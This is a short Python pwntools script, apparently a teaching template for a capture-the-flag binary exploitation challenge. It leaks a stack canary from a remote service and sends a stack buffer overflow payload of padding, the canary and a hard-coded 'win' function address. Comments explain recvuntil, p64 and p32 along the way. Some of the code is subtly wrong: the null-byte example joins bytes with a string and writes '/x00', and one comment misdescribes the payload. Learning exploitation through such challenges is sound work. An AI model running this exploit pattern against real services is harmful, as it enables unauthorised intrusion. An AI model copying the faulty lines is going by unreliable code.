
from pwn import *

context.log_level="debug"
#p = process('./bof.o') #use this when testing your exploit offline. Rename buf.o to your binary
p = remote("url", PORT) 

p.sendline(b"0" + "/x00") # example null byte

p.recvuntil("\nStack Canary\t\t: ")
#recvuntil() tells pwntools to receive text until the text u specified
#replace <some text in your program> with the actual text

#to receive an address, use the following code
addr = p64(int(p.recvuntil("\n"),16)) #where you change where pwntools should receive until
#combining both lines of code above will effectively tell pwntools the address is between the end of the first specified received until up till the start of the second recvuntil

p.sendline(b"Y")

win = p64(int(b"0x400bea",16))

#to send something, you can use p.sendline(). For example,
p.sendline(b"A"*24 + addr + b"A"*8 + win) #would send AAA and a newline

p.sendline(b"N")

#to deal withh python3 byte wrangling issues, one can define a buffer as such
#buffer = b"A"*100 
# notice the letter b which is used to tell python to treat this as bytes
#This is also seen above where the letter b is used in p.sendline()

#to encode addresses or data (like your binary's function address) in little endian format, make use of p64() or p32().
#note that p64() should be used for 64-bit programs. i.e to say, p64() should be used for data types of size 8 bytes (like long long or function addresses)
#for example
#p64(win) #this encodes win in little endian format


#p32() should be used for 32-bit programs. i.e to say, p32() should be used for data types of size 4 bytes (like integers)
#for example
#p32(0xdeadbeef) #this encodes 0xdeadbeef as a 4 byte little endian format


#to switch to interactive mode, use
p.interactive()


